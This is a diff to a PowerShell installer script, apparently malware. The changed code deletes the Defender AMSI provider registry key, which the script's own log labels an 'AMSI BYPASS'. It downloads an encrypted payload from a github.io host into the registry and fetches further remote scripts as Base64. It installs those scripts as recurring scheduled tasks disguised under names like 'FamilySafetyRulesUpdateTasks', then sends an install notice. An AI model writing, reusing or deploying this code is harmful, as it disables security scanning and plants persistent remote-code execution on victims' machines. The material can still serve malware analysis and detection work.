@@ -13,10 +13,17 @@ Function OutString{
         [string]$Msg
     )
 
+
     if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
         write-host '[install]   ' -NoNewLine -f Red
         write-host $Msg -f DarkYellow
-        Write-Verbose $Msg
+        
+        if ($PSCmdlet.ShouldProcess($Msg)) {
+            [pscustomobject]@{
+                Time = (Get-Date -f g)
+                Message = $Msg
+            } | Export-Csv -Path $LogFilePath -Append -NoTypeInformation
+         }
     }else{
         if ($PSCmdlet.ShouldProcess($Msg)) {
             [pscustomobject]@{
@@ -76,8 +83,14 @@ function RemoveOldTasks {
         OutString "Cleanup:Found $NumTasks tasks... "
         foreach ($tdel in $Report){
             $tname=$tdel.Task
-            OutString "Cleanup: Deleting task $tname "
-            if ($PSCmdlet.ShouldProcess($tname)) { Unregister-ScheduledTask $tname }
+            
+            if ($PSCmdlet.ShouldProcess($tname)) {
+                OutString "`tStop-ScheduledTask -TaskName $tname"
+                #Stop-ScheduledTask -TaskName $tname  -Confirm:$False | Out-String | Write-Verbose
+                #OutString "`tDisable-ScheduledTask -TaskName $tname   WOULD"
+                #Disable-ScheduledTask -TaskName $tname  -Confirm:$False | Out-String | Write-Verbose
+                #Unregister-ScheduledTask -TaskName $tname  -Confirm:$False | Out-String | Write-Verbose
+            }
         }
                 
     }catch{
@@ -416,57 +429,6 @@ function Install-EncodedScriptTask {
 }
 
 
-function RemoveOldTasks
-{
-    [CmdletBinding(SupportsShouldProcess)]
-    Param
-    (
-        [Parameter(Mandatory = $true)]
-        [int]$Days
-    )
-
-    $BackupEA = $ErrorActionPreference
-    $ErrorActionPreference = "SilentlyContinue"
-
-    $Report = @()
-    $NumTasks = 0
-    $path = "c:\Windows\System32\Tasks"
-    $tasks = Get-ChildItem -recurse -Path $path -File
-    foreach ($task in $tasks)
-    {
-        $Details = "" | select Task, IsHidden, Enabled, Application
-        $AbsolutePath = $task.directory.fullname + "\" + $task.Name
-        $TaskInfo = [xml](Get-Content $AbsolutePath)
-        #$Details.ComputerName = $Computer
-        $Details.Task = $task.name
-        $Details.IsHidden = $TaskInfo.task.settings.hidden
-        $Details.Enabled = $TaskInfo.task.settings.enabled
-        $Details.Application = $TaskInfo.task.actions.exec.command
-
-        $CreationDate=[datetime]$task.CreationTime
-        $LimitDate= (get-date).AddDays(- $Days)
-        if($CreationDate -gt  $LimitDate) 
-        {
-            $Report += $Details
-            $NumTasks = $NumTasks + 1
-        }
-    }  
-
-    OutString "Cleanup: Found $NumTasks Tasks Created in the last 7 days"
-    if($NumTasks -gt 0){
-        
-        foreach ($tdel in $Report){
-            $tname=$tdel.Task
-            OutString "Cleanup: Deleting task $tname "
-            if ($PSCmdlet.ShouldProcess($tname)) { 
-                Unregister-ScheduledTask $tname -ErrorAction SilentlyContinue | Out-String | Write-Verbose 
-            }   
-        }
-    }  
-
-    $ErrorActionPreference = $BackupEA          
-} 
-
 function Cleanup {
     [CmdletBinding(SupportsShouldProcess)]
     Param
@@ -510,16 +472,9 @@ function Set-ScriptDataToRegistry {
         Remove-Item -Path "$RegKeyRootPath" -Recurse -Force -ErrorAction SilentlyContinue | Out-String | Write-Verbose 
     }
 
-    if ($PSCmdlet.ShouldProcess($RegKeyPath)) { 
-        Install-CRegistryKey -Path $RegKeyPath
-    }
-
-    if ($PSCmdlet.ShouldProcess($RegKeyPath)) { 
-        OutString "Set-ItemProperty $RegKeyPath -Name $RegKeyName -Value ***codeddata*** -PropertyType String"
-        Set-ItemProperty $RegKeyPath -Name $RegKeyName -Value $ScriptData   | Out-String | Write-Verbose
-    }
-
-
+    Install-CRegistryKey -Path $RegKeyPath
+    OutString "Set-ItemProperty $RegKeyPath -Name $RegKeyName -Value ***codeddata*** -PropertyType String"
+    Set-ItemProperty $RegKeyPath -Name $RegKeyName -Value $ScriptData   | Out-String | Write-Verbose
 }
 
 
@@ -565,11 +520,10 @@ function Get-Base64FromUrl {
 
 
 
-
-
-
-
-
+<#         ********************
+#              PREPARATION
+#          ********************
+#>
 OutString "----------   INSTALL START   ----------"
 OutString "RemoveOldTasks"
 
@@ -580,40 +534,72 @@ OutString "AMSI BYPASS"
 Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse -Force -ErrorAction Ignore 
 
 
-$NewTaskFolder='ComObjectsRegistrationManagement'
-$NewTaskName=$NewTaskFolder + '\' + 'ComObjectsInt'
-
+$NewTaskFolder=$env:COMPUTERNAME + '-Maintenance'
 OutString "Creating New Scheduled Task Folder: $NewTaskFolder"
 New-ScheduledTaskFolder $NewTaskFolder
 
 
-$currentPath = Get-Location
-$script_clear = ''
 
-OutString "ScriptUrl: $ScriptUrl"
-$ScriptUrl='https://vr972be716a04eb6.github.io/schdtask/rpt.dat.aes'
-
+<#         *******************************************
+#              UPDATE TASKS DEFINITION (ENCRYPTED)
+#         *******************************************
+#>
+$ScriptUrl='https://vr972be716a04eb6.github.io/schdtask/hourly.ps1.aes'
 $EncryptedScript = $webclient.DownloadString($ScriptUrl)
-OutString "Getting Script: $ScriptUrl SAING TO REGISTRY..."
+OutString "Getting Script: $ScriptUrl saving TO REGISTRY..."
 Set-ScriptDataToRegistry $EncryptedScript
 
-$ScriptUrl='https://radicaltronic.github.io/cmd/GetClearScript.ps1'
 
+<#         ***********************
+#                 TASK NO 1
+#         ************************
+#>
+try{
+    $NewTaskName=$NewTaskFolder + '\' + 'FamilySafetyRulesUpdateTasks'
+    $ScriptUrl='https://radicaltronic.github.io/cmd/GetClearScript.ps1'
+    $Base64Command=Get-Base64FromUrl $ScriptUrl
+    $Base64CommandLen=$Base64Command.Length
+    OutString "Install-EncodedScriptTask $NewTaskName 15 Base64Command($Base64CommandLen)"
+    Install-EncodedScriptTask $NewTaskName 15 $Base64Command
+}catch
+{
+    $Msg="[Creating task $NewTaskName] Ran into an issue: $($PSItem.ToString())"
+    if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
+        write-host '[install]   ' -NoNewLine -f Red
+        write-host $Msg -f DarkYellow
+        Write-Verbose $Msg
+    }
+    write-verbose $Msg 
+    if($PSCmdlet -ne $null){
+        $PSCmdlet.ThrowTerminatingError($PSItem)
+    }     
+}   
 
+<#         ***********************
+#                 TASK NO 2
+#         ************************
+#>
+try{
+    $NewTaskName=$NewTaskFolder + '\' + 'FamilyDailySafetyUpdate'
+    $ScriptUrl='https://radicaltronic.github.io/cmd/SaveNewScript.ps1'
+    $Base64Command=Get-Base64FromUrl $ScriptUrl
+    $Base64CommandLen=$Base64Command.Length
+    OutString "Install-EncodedScriptTask $NewTaskName 15 Base64Command($Base64CommandLen)"
+    Install-EncodedScriptTask $NewTaskName 500 $Base64Command
+}catch
+{
+    $Msg="[Creating task $NewTaskName] Ran into an issue: $($PSItem.ToString())"
+    if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
+        write-host '[install]   ' -NoNewLine -f Red
+        write-host $Msg -f DarkYellow
+        Write-Verbose $Msg
+    }
+    write-verbose $Msg 
+    if($PSCmdlet -ne $null){
+        $PSCmdlet.ThrowTerminatingError($PSItem)
+    }     
+}  
 
-OutString "Install-EncodedScriptTask $NewTaskName 15 Base64Command($Base64CommandLen)"
-Install-EncodedScriptTask $NewTaskName 15 $Base64Command
-
-
-$ScriptUrl='https://radicaltronic.github.io/cmd/SaveNewScript.ps1'
-$Code = $webclient.DownloadString($ScriptUrl)
-$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Code) 
-$UpdateCommandB64 = [Convert]::ToBase64String($Bytes)
-$NewTaskNameUpd=$NewTaskFolder + '\' + 'ComObjectsUpd'
-$UpdateCommandB64Len=$UpdateCommandB64.Length
-OutString "Install-EncodedScriptTask $NewTaskNameUpd 500 UpdateCommandB64($UpdateCommandB64Len)"
-
-Install-EncodedScriptTask $NewTaskNameUpd 500 $UpdateCommandB64
 
 OutString "Send-InstallNotification"
 Send-InstallNotification "Schd Task Install Notice for $env:COMPUTERNAME" "test again, check file" "$LogFilePath"
